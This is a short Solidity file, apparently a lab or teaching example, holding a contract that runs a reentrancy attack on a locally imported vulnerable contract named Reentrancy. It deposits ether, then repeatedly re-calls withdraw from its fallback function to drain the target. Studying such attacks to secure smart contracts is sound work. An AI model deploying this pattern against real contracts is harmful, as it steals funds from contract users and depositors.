// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;
import './Reentrancy.sol';

contract AttackReentrancy{
    Reentrancy public reentracyContract;

    constructor( address _contractAddress) public{
        reentracyContract = Reentrancy(_contractAddress);
    }

    fallback() external payable{
        reentracyContract.withdraw(1 ether);
    }

    function withdrawAttack() external payable {
        require(msg.value>= 1 ether);
        reentracyContract.deposit{value:1 ether}();
        reentracyContract.withdraw(1 ether);
    }
}